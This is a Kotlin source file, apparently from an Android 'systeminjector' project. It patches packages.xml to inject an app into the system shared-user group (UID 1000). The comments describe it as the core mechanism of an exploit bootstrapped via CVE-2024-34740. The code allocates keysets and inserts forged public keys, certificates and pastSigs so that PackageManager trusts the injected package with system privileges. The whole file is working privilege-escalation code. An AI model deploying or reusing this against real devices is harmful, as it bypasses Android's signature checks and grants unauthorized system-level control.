package com.penumbraos.systeminjector.common

import org.w3c.dom.Document
import org.w3c.dom.Element
import org.w3c.dom.NodeList
import java.io.ByteArrayOutputStream
import javax.xml.parsers.DocumentBuilderFactory
import javax.xml.transform.TransformerFactory
import javax.xml.transform.dom.DOMSource
import javax.xml.transform.stream.StreamResult
import javax.xml.xpath.XPathConstants
import javax.xml.xpath.XPathFactory
import kotlin.math.max

/**
 * Patches a packages.xml DOM to inject a new package entry into the
 * android.uid.system shared user group.
 *
 * This is the core mechanism: PMS on boot reads packages.xml (or
 * packages-backup.xml if present) and trusts whatever is in it.
 * By injecting a <package> element with matching signing info into
 * the <shared-user userId="1000"> group, PMS will grant the app
 * system UID privileges.
 *
 * Shared between the exploit (bootstrap via CVE-2024-34740) and the
 * installer (ongoing installs via direct file access as UID 1000).
 */
object PackagesXmlPatcher {

    private val packageNamePattern = Regex("[A-Za-z][A-Za-z0-9_]*(\\.[A-Za-z][A-Za-z0-9_]*)+")

    /** Return the single persisted package code path, rejecting a corrupt duplicate entry. */
    fun findPackageCodePath(document: Document, packageName: String): String? {
        require(packageName.matches(packageNamePattern)) { "Invalid package name: $packageName" }
        val xPath = XPathFactory.newInstance().newXPath()
        val matches = xPath.compile("/packages/package[@name='$packageName']")
            .evaluate(document, XPathConstants.NODESET) as NodeList
        check(matches.length <= 1) { "Multiple packages.xml entries exist for '$packageName'" }
        return (matches.item(0) as? Element)?.getAttribute("codePath")
    }

    /**
     * Insert a new package into the packages.xml DOM.
     *
     * Performs the following mutations on [document]:
     * 1. Allocates new keyset and key IDs (increments lastIssuedKeySetId / lastIssuedKeyId)
     * 2. Inserts a <public-key> element under /packages/keyset-settings/keys
     * 3. Inserts a <keyset> element under /packages/keyset-settings/keysets
     * 4. Finds next available cert index
     * 5. Inserts a <package> element (before first <shared-user>)
     * 6. Replaces <pastSigs> under <shared-user userId="[sharedUserId]"><sigs>
     *
     * @param document The parsed packages.xml DOM (mutable, modified in-place)
     * @param packageName The package name to inject (e.g. "com.penumbraos.systeminjector")
     * @param codePath The APK directory path (e.g. "/data/app/com.penumbraos.systeminjector-injected")
     * @param sharedUserId The numeric shared user ID (1000 for system)
     * @param primaryCpuAbi The primary CPU ABI (e.g. "arm64-v8a") if native libs are present, null otherwise
     * @param replaceExisting Whether to replace a retained package settings entry. Android keeps
     * such an entry after `pm uninstall -k`; callers must only enable this after Package Manager
     * no longer reports the package installed.
     */
    fun insertPackage(
        document: Document,
        packageName: String,
        codePath: String,
        sharedUserId: Int,
        primaryCpuAbi: String? = null,
        replaceExisting: Boolean = false,
    ) {
        require(packageName.matches(packageNamePattern)) { "Invalid package name: $packageName" }
        val xPath = XPathFactory.newInstance().newXPath()

        // Certificate indexes in packages.xml are references into a document-order pool. The
        // first occurrence of an index carries the key and later occurrences may omit it. Keep
        // the original index-to-key map so replacing the package that owns that first occurrence
        // cannot strand retained sibling packages with an unresolved numeric reference.
        validateCertificateReferences(document)
        val originalCertificateKeys = collectCertificateKeys(document)

        // Use a collision-free provisional index while mutating the DOM. The entire certificate
        // pool is canonicalized after the package and shared-user signatures have been updated.
        var newCertIndex = 0
        val certs = xPath.compile("/packages//cert[@index]")
            .evaluate(document, XPathConstants.NODESET) as NodeList
        for (i in 0 until certs.length) {
            val certIndex = (certs.item(i) as Element).getAttribute("index").toInt()
            newCertIndex = max(newCertIndex, certIndex + 1)
        }

        // A keep-data uninstall deliberately leaves PackageSetting in packages.xml. The ongoing
        // installer replaces that stale entry after its provider has verified the package is no
        // longer installed. Bootstrap keeps the default strict behavior so it cannot overwrite a
        // live injector entry.
        val existingMatches = xPath.compile("/packages/package[@name='$packageName']")
            .evaluate(document, XPathConstants.NODESET) as NodeList
        check(existingMatches.length <= 1) {
            "Multiple packages.xml entries exist for '$packageName'"
        }
        val existingPkg = existingMatches.item(0) as? Element
        if (existingPkg != null) {
            if (!replaceExisting) {
                throw IllegalStateException(
                    "Package '$packageName' already exists in packages.xml. It must be uninstalled before re-injection."
                )
            }
            existingPkg.parentNode.removeChild(existingPkg)
        }

        // Allocate keyset identifiers
        val lastIssuedKeySetId = xPath.compile("/packages/keyset-settings/lastIssuedKeySetId")
            .evaluate(document, XPathConstants.NODE) as Element
        val lastIssuedKeyId = xPath.compile("/packages/keyset-settings/lastIssuedKeyId")
            .evaluate(document, XPathConstants.NODE) as Element
        val newKeySetId = lastIssuedKeySetId.getAttribute("value").toInt() + 1
        val newKeyId = lastIssuedKeyId.getAttribute("value").toInt() + 1
        lastIssuedKeySetId.setAttribute("value", newKeySetId.toString())
        lastIssuedKeyId.setAttribute("value", newKeyId.toString())

        // Insert <public-key> for the new package
        val publicKey = document.createElement("public-key").apply {
            setAttribute("identifier", newKeyId.toString())
            setAttribute("value", SigningConstants.TARGET_KEY_BASE64)
        }
        (xPath.compile("/packages/keyset-settings/keys")
            .evaluate(document, XPathConstants.NODE) as Element).appendChild(publicKey)

        // Insert <keyset> for the new package
        val keyset = document.createElement("keyset").apply {
            setAttribute("identifier", newKeySetId.toString())
            appendChild(
                document.createElement("key-id").apply {
                    setAttribute("identifier", newKeyId.toString())
                }
            )
        }
        (xPath.compile("/packages/keyset-settings/keysets")
            .evaluate(document, XPathConstants.NODE) as Element).appendChild(keyset)

        // Insert <package> element (before first <shared-user>)
        val packageElem = document.createElement("package").apply {
            setAttribute("name", packageName)
            setAttribute("codePath", codePath)
            setAttribute("sharedUserId", sharedUserId.toString())
            // These UID-1000 APKs live only under /data/app. Marking one FLAG_SYSTEM makes
            // PackageManager's boot scan treat it as a removed system-partition package and
            // delete its PackageSetting before the data-app scan can load it.
            setAttribute("publicFlags", "0")
            if (primaryCpuAbi != null) {
                setAttribute("primaryCpuAbi", primaryCpuAbi)
            }
            appendChild(
                document.createElement("sigs").apply {
                    setAttribute("count", "1")
                    setAttribute("schemeVersion", "2")
                    appendChild(
                        document.createElement("cert").apply {
                            setAttribute("index", newCertIndex.toString())
                            setAttribute("key", SigningConstants.TARGET_CERT_HEX)
                        }
                    )
                }
            )
        }

        val firstSharedUser = xPath.compile("/packages/shared-user")
            .evaluate(document, XPathConstants.NODE) as Element
        firstSharedUser.parentNode.insertBefore(packageElem, firstSharedUser)

        // Insert <pastSigs> into <shared-user userId="$sharedUserId"><sigs>
        val sharedUserSigs = xPath
            .compile("/packages/shared-user[@userId=\"$sharedUserId\"]/sigs")
            .evaluate(document, XPathConstants.NODE) as Element

        // Delete any existing <pastSigs>
        while (true) {
            val childNodes = sharedUserSigs.childNodes
            var found = false
            for (i in 0 until childNodes.length) {
                val item = childNodes.item(i)
                if (item is Element && item.nodeName == "pastSigs") {
                    sharedUserSigs.removeChild(item)
                    found = true
                    break
                }
            }
            if (!found) break
        }

        // Insert new <pastSigs>
        sharedUserSigs.appendChild(
            document.createElement("pastSigs").apply {
                setAttribute("count", "2")
                setAttribute("schemeVersion", "3")
                for (i in 0..1) {
                    appendChild(
                        document.createElement("cert").apply {
                            setAttribute("index", newCertIndex.toString())
                            setAttribute("flags", "2")
                        }
                    )
                }
            }
        )

        canonicalizeCertificateIndexes(document, originalCertificateKeys)
    }

    /** Collect every concrete certificate definition, rejecting conflicting index reuse. */
    private fun collectCertificateKeys(document: Document): Map<Int, String> {
        val keys = mutableMapOf<Int, String>()
        val certs = document.getElementsByTagName("cert")
        for (i in 0 until certs.length) {
            val cert = certs.item(i) as Element
            if (!cert.hasAttribute("key")) continue
            val index = cert.getAttribute("index").toIntOrNull()
                ?: error("Certificate has an invalid index: ${cert.getAttribute("index")}")
            val key = cert.getAttribute("key")
            check(key.isNotEmpty()) { "Certificate index $index has an empty key" }
            val previous = keys.putIfAbsent(index, key)
            check(previous == null || previous == key) {
                "Certificate index $index is defined with conflicting keys"
            }
        }
        return keys
    }

    /**
     * Rebuild the document-order certificate pool after a package replacement.
     *
     * Removing a package can also remove the only key-bearing occurrence of a certificate while
     * retained packages still contain reference-only `<cert index="..." />` nodes. Resolve every
     * surviving reference through the pre-mutation pool, then assign dense indexes and place the
     * key on the first surviving occurrence. Numeric indexes are serialization-local references;
     * the signing keys and per-node flags remain unchanged.
     */
    private fun canonicalizeCertificateIndexes(
        document: Document,
        originalCertificateKeys: Map<Int, String>,
    ) {
        val keysByProvisionalIndex = originalCertificateKeys.toMutableMap()
        val certs = document.getElementsByTagName("cert")

        for (i in 0 until certs.length) {
            val cert = certs.item(i) as Element
            if (!cert.hasAttribute("key")) continue
            val index = cert.getAttribute("index").toIntOrNull()
                ?: error("Certificate has an invalid index: ${cert.getAttribute("index")}")
            val key = cert.getAttribute("key")
            check(key.isNotEmpty()) { "Certificate index $index has an empty key" }
            val previous = keysByProvisionalIndex.putIfAbsent(index, key)
            check(previous == null || previous == key) {
                "Certificate index $index is defined with conflicting keys"
            }
        }

        val denseIndexByKey = linkedMapOf<String, Int>()
        for (i in 0 until certs.length) {
            val cert = certs.item(i) as Element
            val provisionalIndex = cert.getAttribute("index").toIntOrNull()
                ?: error("Certificate has an invalid index: ${cert.getAttribute("index")}")
            val key = if (cert.hasAttribute("key")) {
                cert.getAttribute("key")
            } else {
                keysByProvisionalIndex[provisionalIndex]
                    ?: error("Certificate index $provisionalIndex has no key definition")
            }
            val isFirstOccurrence = key !in denseIndexByKey
            val denseIndex = denseIndexByKey.getOrPut(key) { denseIndexByKey.size }
            cert.setAttribute("index", denseIndex.toString())
            if (isFirstOccurrence) {
                cert.setAttribute("key", key)
            } else {
                cert.removeAttribute("key")
            }
        }

        validateCertificateReferences(document)
    }

    /** Mirror PackageSignatures' document-order pool rules before a backup is written. */
    private fun validateCertificateReferences(document: Document) {
        val keys = mutableListOf<String>()
        val certs = document.getElementsByTagName("cert")
        for (i in 0 until certs.length) {
            val cert = certs.item(i) as Element
            val index = cert.getAttribute("index").toIntOrNull()
                ?: error("Certificate has an invalid index: ${cert.getAttribute("index")}")
            check(index >= 0) { "Certificate index must be non-negative: $index" }
            if (cert.hasAttribute("key")) {
                val key = cert.getAttribute("key")
                check(key.isNotEmpty()) { "Certificate index $index has an empty key" }
                if (index < keys.size) {
                    check(keys[index] == key) {
                        "Certificate index $index is defined with conflicting keys"
                    }
                } else {
                    check(index == keys.size) {
                        "Certificate index $index creates a gap after ${keys.size - 1}"
                    }
                    keys += key
                }
            } else {
                check(index < keys.size) {
                    "Certificate index $index is referenced before its key definition"
                }
            }
        }
    }

    /**
     * Serialize a packages.xml DOM to bytes and validate the output.
     *
     * Safety: This is the validation gate that prevents writing corrupt data.
     * Every code path that writes packages-backup.xml MUST go through this.
     *
     * Checks:
     * - Output is > 100 bytes (catches empty/truncated serialization)
     * - Output re-parses as valid XML
     * - Root element is <packages> (catches wrong document or mangled structure)
     *
     * @param document The DOM to serialize
     * @return The serialized XML bytes, ready to write to packages-backup.xml
     * @throws IllegalStateException if any validation check fails
     */
    fun serializeAndValidate(document: Document): ByteArray {
        validateCertificateReferences(document)
        val baos = ByteArrayOutputStream()
        TransformerFactory.newInstance().newTransformer()
            .transform(DOMSource(document), StreamResult(baos))

        val outputBytes = baos.toByteArray()
        check(outputBytes.size > 100) {
            "Serialized packages XML is suspiciously small (${outputBytes.size} bytes)"
        }
        val verifyDoc = DocumentBuilderFactory.newInstance().newDocumentBuilder()
            .parse(outputBytes.inputStream())
        check(verifyDoc.documentElement.nodeName == "packages") {
            "Serialized XML root element is '${verifyDoc.documentElement.nodeName}', expected 'packages'"
        }
        validateCertificateReferences(verifyDoc)

        return outputBytes
    }
}
